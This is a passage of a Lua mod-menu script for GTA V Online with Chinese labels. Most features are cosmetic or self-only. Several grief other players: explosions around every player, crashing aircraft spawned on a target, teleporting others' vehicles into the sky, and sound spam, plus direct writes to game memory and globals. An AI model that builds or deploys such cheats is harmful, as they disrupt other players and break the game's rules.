    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        if os.time() - request_time >= 10 then
            break
        end
        wait()
    end
end
--飞机坠落
 angry_planes = false
 angry_planes_tar = 0
function start_angryplanes_thread()
    util.create_thread(function()
        local v_hashes = {util.joaat('lazer'), util.joaat('jet'), util.joaat('cargoplane'), util.joaat('titan'), util.joaat('luxor'), util.joaat('seabreeze'), util.joaat('vestra'), util.joaat('volatol'), util.joaat('tula'), util.joaat('buzzard'), util.joaat('avenger')}
        if angry_planes_tar == 0 then 
            angry_planes_tar = players.user_ped()
        end
        while true do
            if not angry_planes then 
                util.stop_thread()
            end
            local p_hash = util.joaat('s_m_m_pilot_01')
            local radius = 200
            local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(angry_planes_tar, math.random(-radius, radius), math.random(-radius, radius), math.random(600, 800))
            local pick = v_hashes[math.random(1, #v_hashes)]
            request_model_load(pick)
            local aircraft = entities.create_vehicle(pick, c, math.random(0, 270))
            set_entity_face_entity(aircraft, angry_planes_tar, true)
            VEHICLE.SET_VEHICLE_ENGINE_ON(aircraft, true, true, false)
            VEHICLE.SET_HELI_BLADES_FULL_SPEED(aircraft)
            VEHICLE.SET_VEHICLE_FORWARD_SPEED(aircraft, VEHICLE.GET_VEHICLE_ESTIMATED_MAX_SPEED(aircraft)+1000.0)
            VEHICLE.SET_VEHICLE_OUT_OF_CONTROL(aircraft, true, true)
            --local blip = HUD.ADD_BLIP_FOR_ENTITY(aircraft)
            --HUD.SET_BLIP_SPRITE(blip, 90)
            --HUD.SET_BLIP_COLOUR(blip, 75)
            wait(5000)
        end
    end)
end
function player_toggle_loop(root, pid, menu_name, command_names, help_text, callback)
    return menu.toggle_loop(root, menu_name, command_names, help_text, function()
            if not players.exists(pid) then util.stop_thread() end
    callback()
    end)
end
--爆炸圈
function baozhanquan()
for k,v in pairs(players.list(true, true, true)) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(v)
            explosion_circle(ped, explosion_circle_angle, 25)
        end
        explosion_circle_angle += 0.15
        wait(50)
    end
 function get_closest_veh(coords)
    local closest = nil
    local closest_dist = 1000000
    local this_dist = 0
    for _, veh in pairs(entities.get_all_vehicles_as_handles()) do 
        this_dist = v3.distance(coords, ENTITY.GET_ENTITY_COORDS(veh))
        if this_dist < closest_dist  and ENTITY.GET_ENTITY_HEALTH(veh) > 0 then
            closest = veh
            closest_dist = this_dist
        end
    end
    if closest ~= nil then 
        return {closest, closest_dist}
    else
        return nil 
    end
end
function get_closest_ped(coords)
    local closest = nil
    local closest_dist = 1000000
    local this_dist = 0
    for _, ped in pairs(entities.get_all_peds_as_handles()) do 
        this_dist = v3.distance(coords, ENTITY.GET_ENTITY_COORDS(ped))
        if this_dist < closest_dist and not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped)  and not PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
            closest = ped
            closest_dist = this_dist
        end
    end
    if closest ~= nil then 
        return {closest, closest_dist}
    else
        return nil 
    end
end
function get_closest_ped_to_ped(coords, init_ped)
    local coords = ENTITY.GET_ENTITY_COORDS(init_ped)
    local closest = nil
    local closest_dist = 1000000
    local this_dist = 0
    for _, ped in pairs(entities.get_all_peds_as_handles()) do 
        this_dist = v3.distance(coords, ENTITY.GET_ENTITY_COORDS(ped))
        if this_dist < closest_dist and not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped) and not PED.IS_PED_IN_ANY_VEHICLE(ped, true) and ped ~= init_ped then
            closest = ped
            closest_dist = this_dist
        end
    end
    if closest ~= nil then 
        return {closest, closest_dist}
    else
        return nil 
    end
end
function get_friend_count()
    native_invoker.begin_call();native_invoker.end_call("203F1CFD823B27A4");
    return native_invoker.get_return_value_int();
end
function get_frined_name(friendIndex)
    native_invoker.begin_call();native_invoker.push_arg_int(friendIndex);native_invoker.end_call("E11EBBB2A783FE8B");
    return native_invoker.get_return_value_string();
end
function is_friend_online(name)
    native_invoker.begin_call();native_invoker.push_arg_string(name);native_invoker.end_call("425A44533437B64D");
    return native_invoker.get_return_value_bool();
end
function love_online(name)
    native_invoker.begin_call()native_invoker.end_call_2(0x1077788E268557C2);
    return native_invoker.get_return_value_bool();
end
function max_friend_list()
    native_invoker.begin_call();native_invoker.end_call("AFEBB0D5D8F687D2");
    return native_invoker.get_return_value_int();
end
function socialclub_active()
    native_invoker.begin_call()native_invoker.end_call_2(0xC406BE343FC4B9AF)
    return native_invoker.get_return_value_bool()
end
function gen_fren_funcs(name)
	local balls = menu.list(frendlist,name, {"friend "..name}, "", function(); end)
	menu.divider(balls ,name)
	menu.action(balls,"加入战局", {"jf "..name}, "",function()
		menu.trigger_commands("join "..name)
	end)
	menu.action(balls,"观看玩家", {"sf "..name}, "",function()
		menu.trigger_commands("namespectate "..name)
	end)
	menu.action(balls,"邀请到战局", {"if "..name}, "",function()
		menu.trigger_commands("invite "..name)
	end)
	menu.action(balls,"打开玩家档案", {"pf "..name}, "",function()
		menu.trigger_commands("nameprofile "..name)
	end)
    menu.toggle(balls,"特别关心", {"love ".. name}, "", function(on_toggle)
        if on_toggle then
        if is_friend_online(name) then
            gtoast("您的特别关心 " ..name.. " 目前在线")
            notification("您的特别关心 " ..name.. " 目前在线")
        end
    end
    end)
    --[[if SCRIPT_MANUAL_START then
        if is_friend_online(name) then
            notification("欢迎回到GRANDTOURINGVIP!\n您的特别关心 " ..name.. " 目前在线，您要做些什么嘛？")
        if not is_friend_online(name) then
            notification("欢迎回到GRANDTOURINGVIP!\n您的特别关心目前都没有在线")
        end
    end
end]]
end
defaultHealth = ENTITY.GET_ENTITY_MAX_HEALTH(PLAYER.PLAYER_PED_ID())
moddedHealth = defaultHealth
function custom_health(toggle)
    UsingModHealth = toggle
    local localPed = PLAYER.PLAYER_PED_ID()
    if UsingModHealth then
        PED.SET_PED_MAX_HEALTH(localPed, moddedHealth)
        ENTITY.SET_ENTITY_HEALTH(localPed, moddedHealth)
    else
        PED.SET_PED_MAX_HEALTH(localPed, defaultHealth)
        menu.trigger_command(moddedHealthSlider, defaultHealth) -- just if you want the slider to go to default value when mod health is off
        if ENTITY.GET_ENTITY_HEALTH(localPed) > defaultHealth then
            ENTITY.SET_ENTITY_HEALTH(localPed, defaultHealth)
        end
    end
end
function setcustomhealth(value)
    moddedHealth = value
end
defaultArmour = PLAYER.GET_PLAYER_MAX_ARMOUR(PLAYER.PLAYER_ID())
moddedArmour = defaultArmour
function custom_armor(toggle)
    UsingModArmour = toggle
    if UsingModArmour then
        PLAYER.SET_PLAYER_MAX_ARMOUR(PLAYER.PLAYER_ID(), moddedArmour)
    else
        PLAYER.SET_PLAYER_MAX_ARMOUR(PLAYER.PLAYER_ID(), defaultArmour)
        menu.trigger_command(moddedArmourSlider, defaultArmour) -- just if you want the slider to go to default value when mod Armour is off
    end
end
function setcustomarmor(value)
    moddedArmour = value
end
function healthincover()
    if PED.IS_PED_IN_COVER(players.user_ped(), false) then
		PLAYER._SET_PLAYER_HEALTH_RECHARGE_LIMIT(players.user(), 1.0)
		PLAYER.SET_PLAYER_HEALTH_RECHARGE_MULTIPLIER(players.user(), 15.0)
	else
		PLAYER._SET_PLAYER_HEALTH_RECHARGE_LIMIT(players.user(), 0.5)
		PLAYER.SET_PLAYER_HEALTH_RECHARGE_MULTIPLIER(players.user(), 1.0)
	end
end
local function set_health_refill_limit_and_mult(limit, mult)
    PLAYER._SET_PLAYER_HEALTH_RECHARGE_LIMIT(PLAYER.PLAYER_ID(), limit)
    PLAYER.SET_PLAYER_HEALTH_RECHARGE_MULTIPLIER(PLAYER.PLAYER_ID(), mult)
end
local normal_refill_limit = 0.25
local normal_refill_mult = 1.0
local isCustomRefill_Normal
function standhealthon(toggle)
        isCustomRefill_Normal = toggle
        while isCustomRefill_Normal do
            set_health_refill_limit_and_mult(normal_refill_limit, normal_refill_mult)
            wait(300)
        end
        if not isCustomRefill_Normal then
            set_health_refill_limit_and_mult(0.25, 1.0)
        end
end
function standhpmode(value)
    normal_refill_limit = value * 0.01
end
function standhpmodetime(value)
    normal_refill_mult = value
end
local cover_refill_limit = 0.25
local cover_refill_mult = 1.0
local isCustomRefill_Cover
function hidehealthon(toggle)
    isCustomRefill_Cover = toggle
    while isCustomRefill_Cover do
        if PED.IS_PED_IN_COVER(PLAYER.PLAYER_PED_ID()) then
            set_health_refill_limit_and_mult(cover_refill_limit, cover_refill_mult)
        end
        wait(300)
    end
    if not isCustomRefill_Cover then
        set_health_refill_limit_and_mult(0.25, 1.0)
    end
end
function hidehpmode(value)
    cover_refill_limit = value * 0.01
end
function hidehpmodetime(value)
    cover_refill_mult = value
end
Colour = {}
function New.colour(R, G, B, A)
    return {r = R / 255, g = G / 255, b = B / 255, a = A or 1}
end
function New.hudSettings(X, Y, ALIGNMENT)
    return {xOffset = X, yOffset = Y, scale = 0.5, alignment = ALIGNMENT, textColour = New.colour( 255, 255, 255 )}
end
function New.delay(MS, S, MIN)
    return {ms = MS, s = S, min = MIN}
end
function firewingscale(value)
    fireWingsSettings.scale = value / 10
end
function firewingcolour(colour)
    fireWingsSettings.colour = colour
end
local mildOrangeFire = New.colour( 255, 127, 80 )
fireBreathSettings = {
    scale = 0.3,
    colour = mildOrangeFire,
    on = false,
    y = { value = 0.12, still = 0.12, walk =  0.22, sprint = 0.32, sneak = 0.35 },
    z = { value = 0.58, still = 0.58, walk =  0.45, sprint = 0.38, sneak = 0.35 },
}
local fireWings = {
            [1] = {pos = {[1] = 100, [2] =  50}},
            [2] = {pos = {[1] = 100, [2] = -50}},
            [3] = {pos = {[1] = 115, [2] =  50}},
            [4] = {pos = {[1] = 115, [2] = -50}},
            [5] = {pos = {[1] = 160, [2] =  50}},
            [6] = {pos = {[1] = 160, [2] = -50}},
            [7] = {pos = {[1] = 170, [2] =  50}},
            [8] = {pos = {[1] = 170, [2] = -50}},
			[9] = {pos = {[1] = 110, [2] =  50}},
            [10] = {pos = {[1] = 110, [2] = -50}},
			[11] = {pos = {[1] = 120, [2] =  50}},
            [12] = {pos = {[1] = 120, [2] = -50}},
			[13] = {pos = {[1] = 130, [2] =  50}},
            [14] = {pos = {[1] = 130, [2] = -50}},
			[15] = {pos = {[1] = 190, [2] =  50}},
            [16] = {pos = {[1] = 190, [2] = -50}},
			[17] = {pos = {[1] = 175, [2] =  50}},
            [18] = {pos = {[1] = 175, [2] = -50}},
			[19] = {pos = {[1] = 140, [2] =  50}},
            [20] = {pos = {[1] = 140, [2] = -50}},
			[21] = {pos = {[1] = 150, [2] =  50}},
            [22] = {pos = {[1] = 150, [2] = -50}},
			[23] = {pos = {[1] = 180, [2] =  50}},
            [24] = {pos = {[1] = 180, [2] = -50}},
        }
fireWingsSettings = {
    scale = 0.3,
    colour = mildOrangeFire,
    on = false
}
local ptfxEgg
function firewing(toggle)
    fireWingsSettings.on = toggle
    if fireWingsSettings.on then
        ENTITY.SET_ENTITY_PROOFS(players.user_ped(), false, true, false, false, false, false, 1, false)
        if ptfxEgg == nil then
            local eggHash = 1803116220
            loadModel(eggHash)
            ptfxEgg = entities.create_object(eggHash, ENTITY.GET_ENTITY_COORDS(players.user_ped()))
            ENTITY.SET_ENTITY_COLLISION(ptfxEgg, false, false)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(eggHash)
        end
        for i = 1, #fireWings do
            while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED('weap_xs_vehicle_weapons') do
                STREAMING.REQUEST_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
                wait()
            end
            GRAPHICS.USE_PARTICLE_FX_ASSET('weap_xs_vehicle_weapons')
            fireWings[i].ptfx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY('muz_xs_turret_flamethrower_looping', ptfxEgg, 0, 0, 0.1, fireWings[i].pos[1], 0, fireWings[i].pos[2], fireWingsSettings.scale, false, false, false)
            util.create_tick_handler(function()
                local rot = ENTITY.GET_ENTITY_ROTATION(players.user_ped(), 2)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(ptfxEgg, players.user_ped(), -1, 0, 0, 0, rot.x, rot.y, rot.z, false, false, false, false, 0, false)
                ENTITY.SET_ENTITY_ROTATION(ptfxEgg, rot.x, rot.y, rot.z, 2, true)
                for i = 1, #fireWings do
                    GRAPHICS.SET_PARTICLE_FX_LOOPED_SCALE("weap_xs_vehicle_weapons", fireWingsSettings.scale)
                    GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fireWings[i].ptfx, fireWingsSettings.colour.r, fireWingsSettings.colour.g, fireWingsSettings.colour.b)
                end
                ENTITY.SET_ENTITY_VISIBLE(ptfxEgg, false)
                return fireWingsSettings.on
            end)
        end
    else
        for i = 1, #fireWings do
            if fireWings[i].ptfx then
                GRAPHICS.REMOVE_PARTICLE_FX(fireWings[i].ptfx, true)
                fireWings[i].ptfx = nil
            end
            if ptfxEgg then
                entities.delete_by_handle(ptfxEgg)
                ptfxEgg = nil
            end
        end
        STREAMING.REMOVE_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
    end
end
local function transitionValue(value, target, step)
    if value == target then return value end
    return value + step * ( value > target and -1 or 1 )
end
levitationCommand = menu.ref_by_path('Self>Movement>Levitation>Levitation', 38)
function clumsy()
    if PED.IS_PED_RAGDOLL(players.user_ped()) then wait(3000) return end
        PED.SET_PED_RAGDOLL_ON_COLLISION(players.user_ped(), true)
end
function stumble()
    local vector = ENTITY.GET_ENTITY_FORWARD_VECTOR(players.user_ped())
    PED.SET_PED_TO_RAGDOLL_WITH_FALL(players.user_ped(), 1500, 2000, 2, vector.x, -vector.y, vector.z, 1, 0, 0, 0, 0, 0, 0)
end
function ragdoll_self()
    PED.SET_PED_TO_RAGDOLL(players.user_ped(), 2000, 2000, 0, true, true, true)
end
local is_player_pointing = function ()
	return read_global.int(4521801 + 932) == 3
end
--上帝之指
local targetEntity = NULL
local lastStop <const> = newTimer()
local explosionProof = false
function godfinger()
    if is_player_pointing() then
		write_global.int(4521801 + 937, NETWORK.GET_NETWORK_TIME())
		if not ENTITY.DOES_ENTITY_EXIST(targetEntity) then
			local flag = TraceFlag.peds | TraceFlag.vehicles | TraceFlag.pedsSimpleCollision | TraceFlag.objects
			local raycastResult = get_raycast_result(500.0, flag)
			if raycastResult.didHit and ENTITY.DOES_ENTITY_EXIST(raycastResult.hitEntity) then
				targetEntity = raycastResult.hitEntity
			end
		else
			local myPos = players.get_position(players.user())
			local entityPos = ENTITY.GET_ENTITY_COORDS(targetEntity, true)
			local camDir = CAM.GET_GAMEPLAY_CAM_ROT(0):toDir()
			local distance = myPos:distance(entityPos)
			if distance > 30.0 then distance = 30.0
			elseif distance < 10.0 then distance = 10.0 end
			local targetPos = v3.new(camDir)
			targetPos:mul(distance)
			targetPos:add(myPos)
			local direction = v3.new(targetPos)
			direction:sub(entityPos)
			direction:normalise()
			if ENTITY.IS_ENTITY_A_PED(targetEntity) then
				direction:mul(5.0)
				local explosionPos = v3.new(entityPos)
				explosionPos:sub(direction)
				draw_bounding_box(targetEntity, false, {r = 255, g = 255, b = 255, a = 255})
				set_explosion_proof(players.user_ped(), true)
				explosionProof = true
				FIRE.ADD_EXPLOSION(explosionPos.x, explosionPos.y, explosionPos.z, 29, 25.0, false, true, 0.0, true)
			else
				local vel = v3.new(direction)
				local magnitude = entityPos:distance(targetPos)
				vel:mul(magnitude)
				draw_bounding_box(targetEntity, true, {r = 255, g = 255, b = 255, a = 80})
				request_control_once(targetEntity)
				ENTITY.SET_ENTITY_VELOCITY(targetEntity, vel.x, vel.y, vel.z)
			end
		end
	elseif targetEntity ~= NULL then
		lastStop.reset()
		targetEntity = NULL
	elseif explosionProof and lastStop.elapsed() > 500 then
		explosionProof = false
		set_explosion_proof(players.user_ped(), false)
    end
end
--轨迹
function removeFxs(effects)
	for _, effect in ipairs(effects) do
		GRAPHICS.STOP_PARTICLE_FX_LOOPED(effect, 0)
		GRAPHICS.REMOVE_PARTICLE_FX(effect, 0)
	end
end
local function getZoneName(pid)
    return util.get_label_text(ZONE.GET_NAME_OF_ZONE(v3.get(players.get_position(pid))))
end
local wasDead = false
local respawnPos
local respawnRot
function custom_respawn()
    if respawnPos == nil then return end
    local isDead = PLAYER.IS_PLAYER_DEAD(players.user())
    if wasDead and not isDead then
        while PLAYER.IS_PLAYER_DEAD(players.user()) do
            wait()
        end
        for i = 0, 30 do
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), respawnPos.x, respawnPos.y, respawnPos.z, false, false, false)
            ENTITY.SET_ENTITY_ROTATION(players.user_ped(), respawnRot.x, respawnRot.y, respawnRot.z, 2, true)
            wait()
        end
    end
    wasDead = isDead
end
function save_custom_respawn()
    respawnPos = players.get_position(players.user())
    respawnRot = ENTITY.GET_ENTITY_ROTATION(players.user_ped(), 2)
    menu.set_menu_name(custom_respawn_toggle, '自定义复活' ..': '.. getZoneName(players.user()))
    local pos = 'X: '.. respawnPos.x ..'\nY: '.. respawnPos.y ..'\nZ: '.. respawnPos.z
    menu.set_help_text(custom_respawn_toggle,  pos)
    menu.set_help_text(custom_respawn_location,  '当前位置' ..':\n'.. pos)
end
function getOffsetFromCam(dist)
    local pos = CAM.GET_FINAL_RENDERED_CAM_COORD()
    local dir = v3.toDir(CAM.GET_FINAL_RENDERED_CAM_ROT(2))
    local offset = {
        x = pos.x + dir.x * dist,
        y = pos.y + dir.y * dist,
        z = pos.z + dir.z * dist
    }
    return offset
end
function request_ptfx_asset_lasereyes(asset)
    local request_time = os.time()
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        if os.time() - request_time >= 10 then
            break
        end
        wait()
    end
end
maxHealth_cantseeyouinmap = 328
function undead()
    if  ENTITY.GET_ENTITY_MAX_HEALTH(players.user_ped()) ~= 0 then
		ENTITY.SET_ENTITY_MAX_HEALTH(players.user_ped(), 0)
	end
end
function autoaccept()
    local message_hash = HUD.GET_WARNING_SCREEN_MESSAGE_HASH()
    if message_hash == 15890625 or message_hash == -398982408 or message_hash == -587688989 then
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1.0)
        wait(50)
    end
end
local function bitTest(addr, offset)
    return (memory.read_int(addr) & (1 << offset)) ~= 0
end
local function clearBit(addr, bitIndex)
    memory.write_int(addr, memory.read_int(addr) & ~(1<<bitIndex))
end
function attach_to_player(hash, bone, x, y, z, xrot, yrot, zrot)           --attach object to player ped
    local user_ped = PLAYER.PLAYER_PED_ID()
    hash = util.joaat(hash)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do		
        wait()
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
    local object = OBJECT.CREATE_OBJECT(hash, 0.0,0.0,0, true, true, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(object, user_ped, PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), bone), x, y, z, xrot, yrot, zrot, false, false, false, false, 2, true) 
end
--删除物体
function delete_object(model)
    local hash = util.joaat(model)
    for k, object in pairs(entities.get_all_objects_as_handles()) do
        if ENTITY.GET_ENTITY_MODEL(object) == hash then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false) 
            entities.delete_by_handle(object)
        end
    end
end
--重新模型
--[[function request_model(model)
	if STREAMING.IS_MODEL_VALID(model) and not STREAMING.HAS_MODEL_LOADED(model) then
		STREAMING.REQUEST_MODEL(model)
		while not STREAMING.HAS_MODEL_LOADED(model) do
			wait()
		end
	end
end]]
--生成载具
function set_vehicle_any_parachute(veh,vehiclehash,parachutehash)
    request_model(vehiclehash,300)
    request_model(parachutehash,300)
    VEHICLE.SET_VEHICLE_MODEL_IS_SUPPRESSED(vehiclehash,true)  
    VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(veh,parachutehash)
end
--将玩家传送到花园银行
function sqhy(pid)
         local ped = PLAYER.GET_PLAYER_PED(pid)
        local pc = ENTITY.GET_ENTITY_COORDS(ped)
        local oldcoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED())
        for o = 0, 10 do
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.GET_PLAYER_PED(), pc.x, pc.y, pc.z + 10, false, false, false)
            wait(50)
        end
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false) 
            for a = 0, 10 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, -76, -819, 327, false, false, false)
                wait(100)
            end
            if SE_Notifications then
                notification("传送 " .. NETWORK.NETWORK_PLAYER_GET_NAME(pid) .. " 上去花园银行塔!")
            end
        else
            notification("玩家 " .. NETWORK.NETWORK_PLAYER_GET_NAME(pid) .. " 不在车内!")
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), oldcoords.x, oldcoords.y, oldcoords.z, false, false, false)
end
--将玩家传送到高空
function sqgk(pid)
        local ped = PLAYER.GET_PLAYER_PED(pid)
        local pc = ENTITY.GET_ENTITY_COORDS(ped)
        local oldcoords = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
        for o = 0, 10 do
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), pc.x, pc.y, pc.z + 10, false, false, false)
            wait(50)
        end
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false) 
            for a = 0, 10 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, -75, -818, 2400, false, false, false)
                wait(100)
            end
            if SE_Notifications then
                notification("传送 " .. NETWORK.NETWORK_PLAYER_GET_NAME(pid) .. " 上去高空!")
            end
        else
            notification("玩家 " .. NETWORK.NETWORK_PLAYER_GET_NAME(pid) .. " 不在车内!")
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), oldcoords.x, oldcoords.y, oldcoords.z, false, false, false)
end
-- hedan
GTYYDS = {
    int = function(global, value)
        local radress = memory.script_global(global)
        memory.write_int(radress, value)
    end,
    GTYYDS1 = function(sound, sound_group, wait_for)
        for i = 0, 31, 1 do
            AUDIO.PLAY_SOUND_FROM_ENTITY(-1, sound, PLAYER.GET_PLAYER_PED(i), sound_group, true, 20)
        end
        wait(wait_for)
    end,
    get_coords = function(entity)
        entity = entity or PLAYER.PLAYER_PED_ID()
        return ENTITY.GET_ENTITY_COORDS(entity, true)
    end,
    GTYYDS2 = function(earrape_type, wait_for)
        for i = 0, 31, 1 do
            coords = GTYYDS.get_coords(PLAYER.GET_PLAYER_PED(i))
            FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 100, true, false, 150, false)
            if earrape_type == EARRAPE_BED then
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", coords.x, coords.y, coords.z, "WastedSounds", true, 999999999,
                    true)
            end
            if earrape_type == EARRAPE_FLASH then
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "MP_Flash", coords.x, coords.y, coords.z, "WastedSounds", true,
                    999999999, true)
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "MP_Flash", coords.x, coords.y, coords.z, "WastedSounds", true,
                    999999999, true)
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "MP_Flash", coords.x, coords.y, coords.z, "WastedSounds", true,
                    999999999, true)
            end
        end
        wait(wait_for)
    end
}
function snowpeople(on)
    local zhangzi = "prop_gumball_03"
    local sonwman = "prop_prlg_snowpile"
    if on then
        attach_to_player(sonwman, 0, 0.0, 0, 0, 0, 0,0)
        attach_to_player(sonwman, 0, 0.0, 0, -0.5, 0, 0,0)
        attach_to_player(sonwman, 0, 0.0, 0, -1, 0, 0,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, 50,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, 125,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, -50,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, -125,0)
    else
        delete_object(sonwman)
        delete_object(zhangzi)
    end
end
function ikunjix3(on)
    local zhangzi = "v_ind_chickensx3"
    local sonwman = "v_ind_chickensx3"
    if on then
        attach_to_player(sonwman, 0, 0.0, 0, 0, 0, 0,0)
        attach_to_player(sonwman, 0, 0.0, 0, -0.5, 0, 0,0)
        attach_to_player(sonwman, 0, 0.0, 0, -1, 0, 0,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, 50,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, 125,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, -50,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, -125,0)
    else
        delete_object(sonwman)
        delete_object(zhangzi)
    end
end
function huoqujia(on)
    local zhangzi = "imp_prop_bomb_ball"
    local sonwman = "imp_prop_bomb_ball"
    if on then
        attach_to_player(sonwman, 0, 0.0, 0, -0.5, 0, 0,0)
        attach_to_player(sonwman, 0, 0.0, 0, -0.3, 0, 0,0)
        attach_to_player(sonwman, 0, 0.0, 0, 0.1, 0, 0,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0.3, 0, 50,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0.5, 0, 125,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0.7, 0, -50,0)
        attach_to_player(zhangzi, 0, 0.0, 0, -0.7, 0, -125,0)
    else
        delete_object(sonwman)
        delete_object(zhangzi)
    end
end
local ped_flags = {}
function firepersonl(on)
    ped_flags[430] = on
    if on then
        menu.trigger_commands("godmode off")
        FIRE.START_ENTITY_FIRE(PLAYER.PLAYER_PED_ID())
        ENTITY.SET_ENTITY_PROOFS(players.user_ped(), false, true, false, false, false, false, 0, false)
        menu.trigger_commands("demigodmode on")
    else
        FIRE.STOP_ENTITY_FIRE(PLAYER.PLAYER_PED_ID())
        ENTITY.SET_ENTITY_PROOFS(players.user_ped(), false, false, false, false, false, false, 0, false)
        menu.trigger_commands("godmode on")
    end
end
function get_entities_in_player_range(pId, radius)
	local peds = get_peds_in_player_range(pId, radius)
	local vehicles = get_vehicles_in_player_range(pId, radius)
	local entities = peds
	for i = 1, #vehicles do table.insert(entities, vehicles[i]) end
	return entities
end
function request_fx_asset(asset)
	STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
	while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
		wait()
	end
end
Colour.new = function(R, G, B, A)
    return {r = R or 0, g = G or 0, b = B or 0, a = A or 0}
end
function personllight()
    local localPed = PLAYER.PLAYER_PED_ID()
    local fect = Effect.new("scr_xm_farm", "scr_xm_dst_elec_crackle")
    local effect = Effect.new("scr_ie_tw", "scr_impexp_tw_take_zone")
    local colour = Colour.new(5, 0, 0, 30)
    local colour2 = Colour.new(5, 50, 10, 30)
    request_fx_asset(effect.asset)
    GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
    GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour.r, colour.g, colour.b)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
        effect.name,
        localPed,
        0.0, 0.0, 0.75,
        0.0, 0.0, 0.0,
        0.09,
        false, false, false)
    GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
    GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour2.r, colour2.g, colour2.b)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
        effect.name,
        localPed,
        0.0, 0.0, -2.9,
        0.0, 0.0, 0.0,
        1.0,
        false, false, false)
end
function personllighta()
    local localPed = PLAYER.PLAYER_PED_ID()
    local fect = Effect.new("scr_xm_farm", "scr_xm_dst_elec_crackle")
    local effect = Effect.new("scr_ie_svm_technical2", "scr_dst_cocaine")
    local colour = Colour.new(5, 0, 0, 30)
    local colour2 = Colour.new(5, 50, 10, 30)
    request_fx_asset(effect.asset)
    GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
    GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour.r, colour.g, colour.b)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
        effect.name,
        localPed,
        0.0, 0.0, 0.75,
        0.0, 0.0, 0.0,
        0.09,
        false, false, false)
    GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
    GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour2.r, colour2.g, colour2.b)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
        effect.name,
        localPed,
        0.0, 0.0, -2.9,
        0.0, 0.0, 0.0,
        1.0,
        false, false, false)
end
function personllightb()
    local localPed = PLAYER.PLAYER_PED_ID()
    local fect = Effect.new("scr_xm_farm", "scr_xm_dst_elec_crackle")
    local effect = Effect.new("veh_xs_vehicle_mods", "exp_xs_mine_emp")
    local colour = Colour.new(5, 0, 0, 30)
    local colour2 = Colour.new(5, 50, 10, 30)
    request_fx_asset(effect.asset)
    GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
